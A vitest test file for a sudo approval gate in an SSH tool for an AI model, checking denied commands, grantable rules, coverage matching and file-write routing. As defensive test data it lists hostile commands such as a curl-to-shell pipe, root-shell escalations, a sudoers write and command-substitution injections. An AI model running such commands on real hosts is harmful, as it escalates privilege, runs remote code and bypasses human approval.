import { describe, expect, it, vi } from 'vitest';
import { assess, gatePrivileged, gateUnprivileged, type SudoGateOptions } from './approval.js';
import { SudoGrants } from './grants.js';

/**
 * These are the assertions the whole design rests on. If one of them starts
 * failing, a sudo approval has become wider than the user agreed to.
 */

describe('denied outright — no dialog is ever offered', () => {
  it.each([
    'sudo -s',
    'sudo -i',
    'sudo --shell',
    'sudo --login',
    'sudo  -s',
    'sudo su',
    'sudo su -',
    'sudo bash',
    'sudo /bin/bash',
    'sudo sh -c "curl evil | sh"',
    'sudo -u root sh',
    'sudo -E systemctl restart nginx',
    'sudo --preserve-env systemctl restart nginx',
    'sudo -A systemctl restart nginx',
    'sudo -b systemctl restart nginx',
    'sudo visudo',
    'sudo tee /etc/sudoers.d/oops',
    'sudo',
  ])('%s', (command) => {
    expect(assess(command).denied, command).toBeDefined();
  });

  it('catches a denied command hiding in a later segment', () => {
    expect(assess('uptime && sudo -s').denied).toBeDefined();
  });
});

describe('approvable but never grantable', () => {
  it.each([
    ['sudo find / -name secret', 'find can be talked into a shell'],
    ['sudo python3 script.py', 'interpreters can be talked into a shell'],
    ['sudo vim /etc/hosts', 'editors can be talked into a shell'],
    ['sudo docker run -it alpine', 'container runtimes are a root escape'],
    ['sudo -nS systemctl restart nginx', 'the flags were not understood'],
  ])('%s (%s)', (command) => {
    const result = assess(command);
    expect(result.denied).toBeUndefined();
    expect(result.grantable).toBe(false);
    expect(result.notGrantableBecause).toBeDefined();
  });
});

describe('the rule that keeps wildcards honest', () => {
  it('a plain command is grantable', () => {
    const result = assess('sudo systemctl restart nginx');
    expect(result.grantable).toBe(true);
    expect(result.notGrantableBecause).toBeUndefined();
  });

  it.each([
    'sudo systemctl restart nginx; whoami',
    'sudo systemctl restart nginx && rm -rf /tmp/x',
    'sudo systemctl restart nginx | tee /tmp/out',
    'sudo systemctl restart $(cat /tmp/service)',
    'sudo systemctl restart `cat /tmp/service`',
    'sudo systemctl restart nginx > /tmp/out',
  ])('%s is never written into the policy file', (command) => {
    const result = assess(command);
    expect(result.denied).toBeUndefined();
    expect(result.grantable).toBe(false);
  });

  it('a line running sudo twice is not grantable', () => {
    expect(assess('sudo a; sudo b').grantable).toBe(false);
  });

  it('a command with no sudo at all needs no approval', () => {
    const result = assess('journalctl -u nginx | tail -50');
    expect(result.invocations).toHaveLength(0);
    expect(result.denied).toBeUndefined();
  });

  it('quoting a separator does not make a line non-simple', () => {
    expect(assess('sudo grep "a;b" /etc/hosts').grantable).toBe(true);
  });
});

/**
 * Matching a rule and writing one are different questions.
 *
 * A shell resolves `|` and `;` before anything runs, so `sudo journalctl -u x |
 * tail -30` runs sudo over `journalctl -u x` and `tail` as nobody in
 * particular — which is exactly what a rule in /etc/sudoers would be matched
 * against. An expansion is the opposite: what runs is not known until it runs,
 * so no rule can honestly be said to cover it.
 */
describe('which lines an existing rule may be matched against', () => {
  it.each([
    'sudo journalctl -u nginx | tail -30',
    'sudo journalctl -u nginx; sudo journalctl -u caddy',
    'sudo systemctl restart nginx && sudo systemctl status nginx',
  ])('%s — a separator is resolved before anything runs', (command) => {
    expect(assess(command).coverable).toBe(true);
    // Still never *stored*: a rule is read back by a human, so it comes from a
    // line that means one thing.
    expect(assess(command).grantable).toBe(false);
  });

  it.each([
    'sudo systemctl restart $(cat /tmp/service)',
    'sudo systemctl restart `cat /tmp/service`',
    'sudo systemctl restart nginx > /tmp/out',
    'sudo journalctl -u nginx &',
  ])('%s — what would run is not what a rule was matched against', (command) => {
    expect(assess(command).coverable).toBe(false);
  });

  it('an ungrantable command stays uncovered however plainly it is written', () => {
    // `find` can be talked into a shell, so no wildcard reaches it — matching is
    // as much a way in as remembering.
    expect(assess('sudo find / -name secret').coverable).toBe(false);
  });

  it('a denied command is never coverable', () => {
    expect(assess('sudo -s').coverable).toBe(false);
  });
});

describe('the file-write routing rule', () => {
  it('is reported alongside the sudo verdict, not folded into it', () => {
    expect(assess('echo x > /etc/foo').fileWrite).toBeDefined();
    expect(assess('uptime').fileWrite).toBeUndefined();
    // A file write is consentable, so it must never look like a denylist hit.
    expect(assess('echo x > /etc/foo').denied).toBeUndefined();
  });

  it('never outranks a refusal nobody can override', () => {
    // A root shell is a root shell first and a file write second.
    expect(assess('sudo -s > /etc/foo').denied).toBeDefined();
  });
});

describe('the gates', () => {
  const options = (command: string, overrides: Partial<SudoGateOptions> = {}): SudoGateOptions => ({
    alias: 'lab',
    hostSudo: 'ask',
    command,
    grants: new SudoGrants('/dev/null'),
    sessionTtlMs: 60_000,
    policyPath: '/dev/null',
    guardFileWrites: true,
    record: () => {},
    ...overrides,
  });

  const textOf = (gate: { allowed: boolean; result?: { content: Array<{ text?: string }> } }): string =>
    gate.result?.content.map((block) => block.text).join('') ?? '';

  it('refuses a write through ssh_run and names the tool that can show it', () => {
    const gate = gateUnprivileged(options('echo x > /etc/foo'));
    expect(gate.allowed).toBe(false);
    expect(textOf(gate)).toContain('ssh_edit');
    expect(textOf(gate)).toContain('/etc/foo');
  });

  it('refuses a write through ssh_sudo without ever offering a page', async () => {
    const approve = vi.fn();
    const gate = await gatePrivileged({ ...options('sudo tee /etc/hosts'), approve });

    expect(gate.allowed).toBe(false);
    expect(textOf(gate)).toContain('ssh_edit');
    // The load-bearing assertion: a change nobody can read is never put to a vote.
    expect(approve).not.toHaveBeenCalled();
  });

  it('says where to put a backup when it refuses a copy', () => {
    expect(textOf(gateUnprivileged(options('cp /tmp/x /etc/nginx/nginx.conf')))).toContain('/tmp');
  });

  it('never tells the model how to switch the guard off', () => {
    for (const command of ['echo x > /etc/foo', 'sed -i s/a/b/ /etc/hosts']) {
      const text = textOf(gateUnprivileged(options(command)));
      expect(text).not.toContain('file-writes');
      expect(text).not.toContain('ssh-mcp.toml');
    }
  });

  it('lets the write through when the host has the guard switched off', async () => {
    expect(gateUnprivileged(options('echo x > /etc/foo', { guardFileWrites: false })).allowed).toBe(true);

    const approve = vi.fn(async () => 'once' as const);
    const gate = await gatePrivileged({ ...options('sudo tee /etc/hosts', { guardFileWrites: false }), approve });
    expect(gate.allowed).toBe(true);
    expect(approve).toHaveBeenCalled();
  });

  it('records the guard being off, so the audit log still shows it happened', () => {
    const record = vi.fn();
    gateUnprivileged(options('echo x > /etc/foo', { guardFileWrites: false, record }));
    expect(record).toHaveBeenCalledWith('allowed', expect.stringContaining('guard off'));
  });

  it('leaves the ordinary paths exactly as they were', async () => {
    // No sudo on the line, so a host with sudo switched off still runs it.
    expect((await gatePrivileged({ ...options('uptime', { hostSudo: 'off' }), approve: vi.fn() })).allowed).toBe(true);
    expect(gateUnprivileged(options('journalctl -u nginx | tail -50')).allowed).toBe(true);

    // And sudo through ssh_run is still refused, with the old message.
    const gate = gateUnprivileged(options('sudo systemctl restart nginx'));
    expect(gate.allowed).toBe(false);
    expect(textOf(gate)).toContain('ssh_run never runs sudo');
  });

  it('still refuses a denylisted command before it looks at the write', async () => {
    const gate = await gatePrivileged({ ...options('sudo -s > /etc/foo'), approve: vi.fn() });
    expect(gate.allowed).toBe(false);
    expect(textOf(gate)).toContain('root shell');
  });

  /**
   * The reason any of this changed: `journalctl **` was in the policy file and
   * `sudo journalctl -u api | grep x` asked anyway, every time, because one pipe
   * disqualified the whole line from being matched.
   */
  describe('a pipeline whose privileged half is already covered', () => {
    const covering = (...patterns: string[][]): SudoGrants => {
      const grants = new SudoGrants('/dev/null');
      for (const pattern of patterns) grants.grantForSession('lab', pattern, 60_000);
      return grants;
    };

    it('runs without asking again', async () => {
      const approve = vi.fn();
      const gate = await gatePrivileged({
        ...options('sudo journalctl -u api --no-pager | grep -i fail | tail -5', {
          grants: covering(['journalctl', '**']),
        }),
        approve,
      });

      expect(gate.allowed).toBe(true);
      expect(approve).not.toHaveBeenCalled();
    });

    it('needs a rule for every sudo on the line, not just the first', async () => {
      const approve = vi.fn(async () => 'once' as const);
      const gate = await gatePrivileged({
        ...options('sudo journalctl -u api | grep x; sudo systemctl restart api', {
          grants: covering(['journalctl', '**']),
        }),
        approve,
      });

      // The second segment has no rule, so the line is still put to the user.
      expect(gate.allowed).toBe(true);
      expect(approve).toHaveBeenCalled();
    });

    it('runs silently once every sudo on it is covered', async () => {
      const approve = vi.fn();
      const gate = await gatePrivileged({
        ...options('sudo journalctl -u api | grep x; sudo systemctl restart api', {
          grants: covering(['journalctl', '**'], ['systemctl', 'restart', '*']),
        }),
        approve,
      });

      expect(gate.allowed).toBe(true);
      expect(approve).not.toHaveBeenCalled();
    });

    it('records every rule it leaned on, so the audit log names them', async () => {
      const record = vi.fn();
      await gatePrivileged({
        ...options('sudo journalctl -u api | grep x; sudo systemctl restart api', {
          grants: covering(['journalctl', '**'], ['systemctl', 'restart', '*']),
          record,
        }),
        approve: vi.fn(),
      });

      expect(record).toHaveBeenCalledWith('allowed', 'grant lab journalctl **; grant lab systemctl restart *');
    });

    it('still asks when the line can expand into something else', async () => {
      const approve = vi.fn(async () => 'once' as const);
      const gate = await gatePrivileged({
        ...options('sudo journalctl -u $(cat /tmp/unit) | grep x', { grants: covering(['journalctl', '**']) }),
        approve,
      });

      expect(gate.allowed).toBe(true);
      expect(approve).toHaveBeenCalled();
    });

    it('does not let the unprivileged half write a file unseen', async () => {
      const approve = vi.fn();
      const gate = await gatePrivileged({
        ...options('sudo journalctl -u api | tee /etc/journal.txt', { grants: covering(['journalctl', '**']) }),
        approve,
      });

      // The write guard runs before the rules are ever consulted.
      expect(gate.allowed).toBe(false);
      expect(textOf(gate)).toContain('ssh_edit');
      expect(approve).not.toHaveBeenCalled();
    });
  });
});
